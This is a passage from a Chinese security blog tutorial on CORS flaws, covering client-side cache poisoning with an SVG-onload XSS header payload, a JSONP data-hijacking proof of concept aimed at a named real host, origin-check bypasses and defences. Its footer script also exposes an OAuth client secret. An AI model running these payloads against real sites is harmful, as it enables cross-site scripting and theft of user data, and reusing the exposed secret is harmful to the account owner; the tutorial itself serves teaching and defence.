<h4 id="⑤客户端高速缓存中毒"><a href="#⑤客户端高速缓存中毒" class="headerlink" title="⑤客户端高速缓存中毒"></a>⑤客户端高速缓存中毒</h4><p>此配置还可能允许攻击者利用其他可能不存在的漏洞利用。<br>例如考虑一个在响应内部反映&quot;<code>X-User</code>&quot;自定义内容的应用程序标题不对其进行任何输入验证也不进行输出编码。<br>请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /login HTTP/1.1</span><br><span class="line">Host: www.target.local</span><br><span class="line">Origin: https://attacker.domain/</span><br><span class="line">X-User: &lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>响应请注意&quot;<code>Access-Control-Allow-Origin</code>&quot;已设置但&quot;<code>Access-Control-Allow-Credentialstrue</code>&quot;和&quot;<code>VaryOrigin</code>&quot;不存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://attacker.domain/</span><br><span class="line">…</span><br><span class="line">Content-Type: text/html</span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">Invalid user: &lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者可以利用此XSS在受控服务器上上载<strong>以下JavaScript代码</strong>然后诱使受害者在其上导航</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var req = new XMLHttpRequest();</span><br><span class="line">req.onload = reqListener;</span><br><span class="line">req.open('get','http://www.target.local/login',true);</span><br><span class="line">req.setRequestHeader('X-User', '<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>');</span><br><span class="line">req.send();</span><br><span class="line">function reqListener() &#123;</span><br><span class="line"> location='http://www.target.local/login';</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果未在响应中设置&quot;<code>VaryOrigin</code>&quot;标头如前面的示例所示受害者的浏览器可以将响应存储在缓存中基于浏览器行为然后直接显示它。<br>当浏览器导航到相关的URL时这可以通过重定向立即完成如在&quot;<code>reqListener</code>&quot;方法中显示。</p>
<h4 id="⑥jsonp跨域"><a href="#⑥jsonp跨域" class="headerlink" title="⑥jsonp跨域"></a>⑥jsonp跨域</h4><p>poc</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引用一段如上请求为JS --&gt;</span><br><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">jsonp2</span>(<span class="params">data</span>)</span>&#123;alert(<span class="built_in">JSON</span>.stringify(data));&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/gh0st.cn/u</span>ser/center?callback=jsonp2<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用正常的账号(绑定过手机号)来测试下：</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygydi0d9hj20dp07776j.jpg" alt></p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
<li>目标存在可控的子域名</li>
</ol>
<p>现在假设目标应用程序实现以下正则表达式以验证&quot;<code>Origin</code>&quot;标头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^https?:\/\/(.*\.)?target\.local$</span><br></pre></td></tr></table></figure>

<p>它允许从&quot;<code>target.local</code>&quot;和任何子域来自HTTP或HTTPS协议进行跨域访问。<br>在此如果攻击者能够控制目标的有效子域例如&quot;<code>subdomain.target.local</code>&quot;<br>利用子域名接管的示例或者如果存在XSS漏洞攻击者可以使用它生成有效的CORS请求。</p>
<ol start="2">
<li>第三方域名</li>
</ol>
<p>有时必须允许第三方域名发出请求。如果攻击者能够在这些域名上上传JavaScript脚本他们可以进行攻击。<br>Amazon S3存储服务有时允许这种情况发生。 如果是目标应用程序使用Amazon服务时可能允许S3存储服务发出请求。<br>在这种情况下攻击者可以在受控的S3存储服务器上托管恶意页面。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
<li><p>1.不要配置&quot;Access-Control-Allow-Origin&quot;为通配符&quot;*&quot;，而且更重要的是，要严格效验来自请求数据包中的&quot;Origin&quot;的值。 当收到跨域请求的时候，要检查&quot;Origin&quot;的值是否是一个可信的源，还要检查是否为null</p>
</li>
<li><p>2.避免使用&quot;Access-Control-Allow-Credentials: true&quot;</p>
</li>
<li><p>3.减少Access-Control-Allow-Methods所允许的方法</p>
</li>
</ul>
<p>提示：</p>
<p>在tomcat的error-page中，只要配置了403错误，会导致OPTIONS方法请求，出现Allow：PUT、DELETE、OPTIONS、TRACE。这些HTTP方法，通过实际验证，还是被禁用阻断的</p>
<p>原本是为了屏蔽 403的错误信息（中间件版本信息泄露（中）），于是按照网上的方法配置error-page ，但是扫描发现又多了 开启了不安全的HTTP方法</p>
<p>之前在conf/web.xml 已经配置过这些方法禁用的；</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyk0fm6t0oj20fe07p3yl.jpg" alt></p>
<p>参考：</p>
<p>圈子： <a href="https://www.secquan.org/Discuss/1068061" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1068061</a></p>
<p>聂心明：<a href="https://blog.csdn.net/niexinming/article/details/82732750" target="_blank" rel="noopener">https://blog.csdn.net/niexinming</a></p>
<p>Youtube视频：<a href="https://www.youtube.com/watch?v=mkv8aoJzGSo&feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=mkv8aoJzGSo&amp;feature=youtu.be</a></p>
<p>geekboy:<a href="http://www.geekboy.ninja/blog/" target="_blank" rel="noopener">http://www.geekboy.ninja/blog/</a></p>
<p>github:<a href="https://github.com/dienuet/crossdomain" target="_blank" rel="noopener">https://github.com/dienuet/crossdomain</a></p>
<p>key：<a href="https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf" target="_blank" rel="noopener">https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf</a></p>

    </div>

    
    
    

    <div>
    
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

    
    </div>
      <div>
        

<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Wh0ale</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://wh0ale.github.io/2018/12/26/2018-12-26-CORS漏洞/" title="cors漏洞">https://wh0ale.github.io/2018/12/26/2018-12-26-CORS漏洞/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>

    <footer class="post-footer">
          
        
        <div class="post-tags">
            <a href="/tags/cors/" rel="tag"><i class="fa fa-tag"></i># cors</a>
          
        </div>
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
              <a href="/2018/12/25/2018-12-25-域渗透之票据/" rel="next" title="域渗透之票据">
                <i class="fa fa-chevron-left"></i> 域渗透之票据
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
              <a href="/2018/12/26/2018-12-26-PHAR/" rel="prev" title="phar相关">
                phar相关 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
    </footer>
  </div>
  
  
  
  </article>

  </div>


          </div>
          
    
    <div class="comments" id="gitalk-container"></div>
  


        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image"
      src="/images/avatar.gif"
      alt="Wh0ale">
  <p class="site-author-name" itemprop="name">Wh0ale</p>
  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">124</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
          
            <a href="/categories/">
          
        
        
        
          
        
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-tags">
        
          
            <a href="/tags/">
          
        
        
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">60</span>
        <span class="site-state-item-name">标签</span>
        </a>
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
      </span>
    
  </div>
  <div class="cc-license motion-element" itemprop="license">
    
  
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



        </div>
      </div>
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CORS处理跨域"><span class="nav-number">1.</span> <span class="nav-text">CORS处理跨域</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简单请求"><span class="nav-number">1.1.</span> <span class="nav-text">简单请求</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本流程"><span class="nav-number">1.1.1.</span> <span class="nav-text">基本流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#withCredentials-属性"><span class="nav-number">1.1.2.</span> <span class="nav-text">withCredentials 属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#响应码"><span class="nav-number">1.1.3.</span> <span class="nav-text">响应码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#非简单请求"><span class="nav-number">1.2.</span> <span class="nav-text">非简单请求</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#预检请求"><span class="nav-number">1.2.1.</span> <span class="nav-text">预检请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预检请求的回应"><span class="nav-number">1.2.2.</span> <span class="nav-text">预检请求的回应</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器的正常请求和回应"><span class="nav-number">1.2.3.</span> <span class="nav-text">浏览器的正常请求和回应</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析ajax跨域"><span class="nav-number">1.3.</span> <span class="nav-text">分析ajax跨域</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#示例一-正常的ajax请求"><span class="nav-number">1.3.1.</span> <span class="nav-text">示例一(正常的ajax请求)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#示例二-跨域错误的ajax请求"><span class="nav-number">1.3.2.</span> <span class="nav-text">示例二(跨域错误的ajax请求)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#示例三-与跨域无关的ajax请求"><span class="nav-number">1.3.3.</span> <span class="nav-text">示例三(与跨域无关的ajax请求)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CORS漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">CORS漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#同源策略"><span class="nav-number">2.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全隐患"><span class="nav-number">2.2.</span> <span class="nav-text">安全隐患</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cors与csrf"><span class="nav-number">2.2.1.</span> <span class="nav-text">cors与csrf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测漏洞"><span class="nav-number">2.2.2.</span> <span class="nav-text">检测漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞点"><span class="nav-number">2.2.3.</span> <span class="nav-text">常见漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实战"><span class="nav-number">2.2.4.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#①-利用某子域的xss绕过Referer的检查"><span class="nav-number">2.2.4.1.</span> <span class="nav-text">① 利用某子域的xss绕过Referer的检查</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#②null源"><span class="nav-number">2.2.4.2.</span> <span class="nav-text">②null源</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#③-poc"><span class="nav-number">2.2.4.3.</span> <span class="nav-text">③ poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#④服务器端高速缓存投毒"><span class="nav-number">2.2.4.4.</span> <span class="nav-text">④服务器端高速缓存投毒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#⑤客户端高速缓存中毒"><span class="nav-number">2.2.4.5.</span> <span class="nav-text">⑤客户端高速缓存中毒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#⑥jsonp跨域"><span class="nav-number">2.2.4.6.</span> <span class="nav-text">⑥jsonp跨域</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">2.2.5.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">2.2.6.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">22:21</span>
</div>

<div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("03/31/2019 00:00:00");
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  
    <span class="post-meta-divider">|</span>
  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  
    
    
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/jquery/index.js?v=3.4.1"></script>
  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
  <script src="/lib/reading_progress/reading_progress.js"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  <script src="/js/utils.js?v=7.3.0"></script>
  <script src="/js/motion.js?v=7.3.0"></script>

  
  <script src="/js/affix.js?v=7.3.0"></script>
  <script src="/js/schemes/pisces.js?v=7.3.0"></script>



  
  <script src="/js/scrollspy.js?v=7.3.0"></script>
<script src="/js/post-details.js?v=7.3.0"></script>



  <script src="/js/next-boot.js?v=7.3.0"></script>

  

  

  


  























  <script src="/js/local-search.js?v=7.3.0"></script>













    
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>

<script>
  var gitalk = new Gitalk({
    clientID: '925b9aa350afc793e04c',
    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
    repo: 'Wh0ale.github.io',
    owner: 'Wh0ale',
    admin: ['Wh0ale'],
    id: md5(location.pathname),
      language: window.navigator.language || window.navigator.userLanguage,
    
    distractionFreeMode: 'true'
  });
  gitalk.render('gitalk-container');
</script>


</body>
</html>
